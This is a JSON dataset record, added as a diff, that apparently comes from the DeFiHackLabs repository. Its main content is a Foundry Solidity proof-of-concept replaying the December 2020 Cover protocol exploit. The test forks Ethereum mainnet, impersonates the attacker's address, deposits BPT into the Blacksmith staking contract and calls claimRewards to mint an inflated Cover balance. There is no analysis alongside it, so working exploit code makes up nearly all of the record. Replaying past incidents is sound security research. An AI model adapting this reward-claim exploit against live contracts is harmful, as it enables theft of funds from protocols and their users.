@@ -1,0 +1,15 @@
+{
+  "incident": "2020-12",
+  "source_path": "src/test/2020-12",
+  "analysis": "Incident analysis unavailable; Solidity PoC is provided directly.",
+  "poc_code": "// Source: src/test/2020-12/Cover_exp.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\ninterface Blacksmith {\n    function claimRewardsForPools(\n        address[] calldata _lpTokens\n    ) external;\n\n    function claimRewards(\n        address _lpToken\n    ) external;\n\n    function deposit(address _lpToken, uint256 _amount) external;\n\n    function withdraw(address _lpToken, uint256 _amount) external;\n}\n\ncontract ContractTest is Test {\n    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    Blacksmith public bs = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);\n\n    IERC20 public bpt = IERC20(0x59686E01Aa841f622a43688153062C2f24F8fDed);\n\n    IERC20 public Cover = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 11_542_309); // fork mainnet at block 11542309\n    }\n\n    function test() public {\n        cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);\n        bs.deposit(address(bpt), 15_255_552_810_089_260_015_361);\n        emit log_named_uint(\"Deposit BPT\", 15_255_552_810_089_260_015_361);\n        cheat.prank(0x00007569643bc1709561ec2E86F385Df3759e5DD);\n        //bs.withdraw(address(bpt),12345678);\n        bs.claimRewards(address(bpt));\n        emit log_named_uint(\n            \"After claimRewards, Cover Balance\", Cover.balanceOf(0x00007569643bc1709561ec2E86F385Df3759e5DD)\n        );\n    }\n}\n",
+  "analysis_files": [],
+  "exploit_files": [
+    "src/test/2020-12/Cover_exp.sol"
+  ],
+  "raw_sol_files": [
+    "sol/2020-12/Cover_exp.sol"
+  ],
+  "repo_owner": "SunWeb3Sec",
+  "repo_name": "DeFiHackLabs"
+}
